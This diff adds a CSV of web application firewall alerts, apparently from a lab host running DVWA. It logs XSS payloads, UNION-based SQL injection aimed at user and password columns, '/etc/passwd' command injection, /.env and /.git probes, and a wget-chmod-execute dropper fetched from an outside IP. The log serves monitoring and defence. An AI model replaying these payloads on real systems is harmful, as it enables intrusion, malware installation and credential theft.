@@ -1,0 +1,237 @@
+Attack Type,URL Used,Payload Used,Severity
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS_NAMES:<script>: <script>,CRITICAL
+XSS Filter - Category 1: Script Tag Vector,,<script> found within ARGS_NAMES:<script>: <script>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<script found within ARGS_NAMES:<script>: <script>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS_NAMES:<script>: <script>,CRITICAL
+XSS Filter - Category 1: Script Tag Vector,,<script> found within ARGS_NAMES:<script>: <script>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<script found within ARGS_NAMES:<script>: <script>,CRITICAL
+XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+XSS Filter - Category 1: Script Tag Vector,"http://35.247.83.47/login.php/?<script>""]",<script> found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,"http://35.247.83.47/login.php/?<script>""]",<script found within REQUEST_HEADERS:Referer: http://35.247.83.47/login.php/?<script>,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Remote Command Execution: Unix Command Injection,,; chmod found within ARGS:country: $(cd /tmp; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk),CRITICAL
+Remote Command Execution: Unix Command Injection,,; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk found within ARGS:country: $(cd /tmp; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk),CRITICAL
+Remote Command Execution: Windows Command Injection,,; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk found within ARGS:country: $(cd /tmp; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk),CRITICAL
+Remote Command Execution: Unix Shell Expression Found,,$(cd/tmp rm -rf shk wget http://103.163.214.97/shk chmod 777 shk ./shk tplink rm -rf shk) found within ARGS:country: $(cd/tmp rm -rf shk wget http://103.163.214.97/shk chmod 777 shk ./shk tplink rm -rf shk),CRITICAL
+Remote Command Execution: Unix Command Injection,,; chmod found within ARGS:country: $(cd /tmp; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk),CRITICAL
+Remote Command Execution: Unix Command Injection,,; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk found within ARGS:country: $(cd /tmp; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk),CRITICAL
+Remote Command Execution: Windows Command Injection,,; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk found within ARGS:country: $(cd /tmp; rm -rf shk; wget http://103.163.214.97/shk; chmod 777 shk; ./shk tplink; rm -rf shk),CRITICAL
+Remote Command Execution: Unix Shell Expression Found,,$(cd/tmp rm -rf shk wget http://103.163.214.97/shk chmod 777 shk ./shk tplink rm -rf shk) found within ARGS:country: $(cd/tmp rm -rf shk wget http://103.163.214.97/shk chmod 777 shk ./shk tplink rm -rf shk),CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,masscan found within REQUEST_HEADERS:User-Agent: ivre-masscan/1.3 https://github.com/robertdavidgraham/,CRITICAL
+Found User-Agent associated with security scanner,,masscan found within REQUEST_HEADERS:User-Agent: ivre-masscan/1.3 https://github.com/robertdavidgraham/,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Restricted File Access Attempt,,/.git/ found within REQUEST_FILENAME: /.git/config,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Found User-Agent associated with security scanner,,zgrab found within REQUEST_HEADERS:User-Agent: mozilla/5.0 zgrab/0.x,CRITICAL
+Oracle SQL Information Leakage,,Oracle SQL Information Leakage: 40\x0aSybase SQL Information Leakage: 40\x0aPHP source code leakage: 4\x0aXSS Attack Detected via libinjection: 12\x0aXSS Filter - Category 1: Script Tag Vector: 6\x0aNoScript XSS InjectionChecker: HTML Injection: 20\x0aPath Traversal Attack (/../): 6\x0aXSS Filter - Category 2: Event Handler Vector: 14\x0aNode-Validator Blacklist Keywords: 4\x0aSQL Injection Attack: Common DB Names Detected: 4\x0aDetects MSSQL code execution and information gathering attempt...,CRITICAL
+mysql SQL Information Leakage,,"You have an error in your SQL syntax; found within RESPONSE_BODY: <!DOCTYPE html>\x0a<html>\x0a<head>\x0a    <title>Log Analysis Report</title>\x0a    <style>\x0a        body {\x0a            font-family: Arial, sans-serif;\x0a            margin: 0;\x0a            padding: 0;\x0a            background-color: #f4f4f4;\x0a            color: #333;\x0a        }\x0a\x0a        .container {\x0a            width: 90%;\x0a            margin: 20px auto;\x0a            background: #fff;\x0a          ...",CRITICAL
+Oracle SQL Information Leakage,,Oracle SQL Information Leakage: 40\\\\x0aSybase SQL Information Leakage: 40\\\\x0aPHP source code leakage: 4\\\\x0aXSS Attack Detected via libinjection: 12\\\\x0aXSS Filter - Category 1: Script Tag Vector: 6\\\\x0aNoScript XSS InjectionChecker: HTML Injection: 20\\\\x0aPath Traversal Attack (/../): 6\\\\x0aXSS Filter - Category 2: Event Handler Vector: 14\\\\x0aNode-Validator Blacklist Keywords: 4\\\\x0aSQL Injection Attack: Common DB Names Detected: 4\\\\x0aDetects MSSQL code execution and information gathering attempt...,CRITICAL
+mysql SQL Information Leakage,,"You have an error in your SQL syntax; found within RESPONSE_BODY: <!DOCTYPE html>\\\\x0a<html>\\\\x0a<head>\\\\x0a    <title>Log Analysis Report</title>\\\\x0a    <style>\\\\x0a        body {\\\\x0a            font-family: Arial, sans-serif;\\\\x0a            margin: 0;\\\\x0a            padding: 0;\\\\x0a            background-color: #f4f4f4;\\\\x0a            color: #333;\\\\x0a        }\\\\x0a\\\\x0a        .container {\\\\x0a            width: 90%;\\\\x0a            margin: 20px auto;\\\\x0a            background: #fff;\\\\x0a          ...",CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Restricted File Access Attempt,,/.env found within REQUEST_FILENAME: /.env,CRITICAL
+Oracle SQL Information Leakage,,Oracle SQL Information Leakage: 40\x0aSybase SQL Information Leakage: 40\x0aPHP source code leakage: 4\x0aXSS Attack Detected via libinjection: 12\x0aXSS Filter - Category 1: Script Tag Vector: 6\x0aNoScript XSS InjectionChecker: HTML Injection: 20\x0aPath Traversal Attack (/../): 6\x0aXSS Filter - Category 2: Event Handler Vector: 14\x0aNode-Validator Blacklist Keywords: 4\x0aSQL Injection Attack: Common DB Names Detected: 4\x0aDetects MSSQL code execution and information gathering attempt...,CRITICAL
+mysql SQL Information Leakage,,"You have an error in your SQL syntax; found within RESPONSE_BODY: <!DOCTYPE html>\x0a<html>\x0a<head>\x0a    <title>Log Analysis Report</title>\x0a    <style>\x0a        body {\x0a            font-family: Arial, sans-serif;\x0a            margin: 0;\x0a            padding: 0;\x0a            background-color: #f4f4f4;\x0a            color: #333;\x0a        }\x0a\x0a        .container {\x0a            width: 90%;\x0a            margin: 20px auto;\x0a            background: #fff;\x0a          ...",CRITICAL
+Oracle SQL Information Leakage,,Oracle SQL Information Leakage: 40\\\\x0aSybase SQL Information Leakage: 40\\\\x0aPHP source code leakage: 4\\\\x0aXSS Attack Detected via libinjection: 12\\\\x0aXSS Filter - Category 1: Script Tag Vector: 6\\\\x0aNoScript XSS InjectionChecker: HTML Injection: 20\\\\x0aPath Traversal Attack (/../): 6\\\\x0aXSS Filter - Category 2: Event Handler Vector: 14\\\\x0aNode-Validator Blacklist Keywords: 4\\\\x0aSQL Injection Attack: Common DB Names Detected: 4\\\\x0aDetects MSSQL code execution and information gathering attempt...,CRITICAL
+mysql SQL Information Leakage,,"You have an error in your SQL syntax; found within RESPONSE_BODY: <!DOCTYPE html>\\\\x0a<html>\\\\x0a<head>\\\\x0a    <title>Log Analysis Report</title>\\\\x0a    <style>\\\\x0a        body {\\\\x0a            font-family: Arial, sans-serif;\\\\x0a            margin: 0;\\\\x0a            padding: 0;\\\\x0a            background-color: #f4f4f4;\\\\x0a            color: #333;\\\\x0a        }\\\\x0a\\\\x0a        .container {\\\\x0a            width: 90%;\\\\x0a            margin: 20px auto;\\\\x0a            background: #fff;\\\\x0a          ...",CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,| cat /etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat/etc/passwd,CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,| cat /etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat/etc/passwd,CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,| cat /etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat/etc/passwd,CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,| cat /etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat/etc/passwd,CRITICAL
+mysql SQL Information Leakage,,"You have an error in your SQL syntax; found within RESPONSE_BODY: <!DOCTYPE html>\x0a<html>\x0a<head>\x0a    <title>Log Analysis Report</title>\x0a    <style>\x0a        body {\x0a            font-family: Arial, sans-serif;\x0a            margin: 0;\x0a            padding: 0;\x0a            background-color: #f4f4f4;\x0a            color: #333;\x0a        }\x0a\x0a        .container {\x0a            width: 90%;\x0a            margin: 20px auto;\x0a            background: #fff;\x0a          ...",CRITICAL
+mysql SQL Information Leakage,,"You have an error in your SQL syntax; found within RESPONSE_BODY: <!DOCTYPE html>\\\\x0a<html>\\\\x0a<head>\\\\x0a    <title>Log Analysis Report</title>\\\\x0a    <style>\\\\x0a        body {\\\\x0a            font-family: Arial, sans-serif;\\\\x0a            margin: 0;\\\\x0a            padding: 0;\\\\x0a            background-color: #f4f4f4;\\\\x0a            color: #333;\\\\x0a        }\\\\x0a\\\\x0a        .container {\\\\x0a            width: 90%;\\\\x0a            margin: 20px auto;\\\\x0a            background: #fff;\\\\x0a          ...",CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,| cat /etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat/etc/passwd,CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,| cat /etc/passwd found within ARGS:ip: 127.0.0.1 | cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1 | cat/etc/passwd,CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEf( found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+SQL Injection Attack: Common DB Names Detected,,"DATABASE( found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEf( found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+SQL Injection Attack: Common DB Names Detected,,"DATABASE( found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT DATABASE(),user()#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEf( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+SQL Injection Attack: Common DB Names Detected,,"DATABASE( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT DATABASE(),table_name from found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEf( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+SQL Injection Attack: Common DB Names Detected,,"DATABASE( found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT DATABASE(),table_name from found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT DATABASE(),table_name from information_schema.tables where table_schema='dvwa'#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEvk found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+SQL Injection Attack: Common DB Names Detected,,"information_schema found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT null,column_name from found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEvk found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+SQL Injection Attack: Common DB Names Detected,,"information_schema found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' UNION S found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"UNION SELECT null,column_name from found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' UNION SELECT found within ARGS:id: 1' UNION SELECT null,column_name from information_schema.columns where table_name='users'#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEnk found within ARGS:id: 1' union select user,password from users#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' union s found within ARGS:id: 1' union select user,password from users#",CRITICAL
+"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"union select user,password from found within ARGS:id: 1' union select user,password from users#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' union select found within ARGS:id: 1' union select user,password from users#",CRITICAL
+SQL Injection Attack Detected via libinjection,,"sUEnk found within ARGS:id: 1' union select user,password from users#",CRITICAL
+Detects MSSQL code execution and information gathering attempts,,"' union s found within ARGS:id: 1' union select user,password from users#",CRITICAL
+"Looking for basic sql injection. Common attack string for mysql, oracle and others",,"union select user,password from found within ARGS:id: 1' union select user,password from users#",CRITICAL
+Detects concatenated basic SQL injection and SQLLFI attempts,,"1' union select found within ARGS:id: 1' union select user,password from users#",CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:name:  <img src=ss onError=alert(\x22XSS)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onError= found within ARGS:name:  <img src=ss onError=alert(\x22XSS)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<img src=ss onError= found within ARGS:name:  <img src=ss onError=alert(\x22XSS)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:name:  <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onError= found within ARGS:name:  <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<img src=ss onError= found within ARGS:name:  <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\x22XSS)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+Node-Validator Blacklist Keywords,,document.cookie found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=, onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=,<img src=ss onError= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name= <img src=ss onError=alert(\\\\x22XSS)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+Node-Validator Blacklist Keywords,,document.cookie found within ARGS:name: <body onload=alert(document.cookie)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=<body, onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=<body,<body onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,http://35.247.83.47/vulnerabilities/xss_r/?name=<body, onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,http://35.247.83.47/vulnerabilities/xss_r/?name=<body,<body onload= found within REQUEST_HEADERS:Referer: http://35.247.83.47/vulnerabilities/xss_r/?name=<body onload=alert(document.cookie)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onerror= found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<img src=sd onerror= found within ARGS:txtName: <img src=sd onerror=alert(\x22XSS\x22)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:mtxMessage: <body onload=alert(\x22supbij\x22)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
+XSS Attack Detected via libinjection,,XSS data found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onerror= found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
+XSS Filter - Category 2: Event Handler Vector,, onload= found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<img src=sd onerror= found within ARGS:txtName: <img src=sd onerror=alert(\\\\x22XSS\\\\x22)>,CRITICAL
+NoScript XSS InjectionChecker: HTML Injection,,<body onload= found within ARGS:mtxMessage: <body onload=alert(\\\\x22supbij\\\\x22)>,CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Command Injection,,|cat /etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
+Remote Command Execution: Unix Shell Code Found,,etc/passwd found within ARGS:ip: 127.0.0.1|cat/etc/passwd,CRITICAL
+OS File Access Attempt,,etc/passwd found within ARGS:ip: 127.0.0.1|cat /etc/passwd,CRITICAL
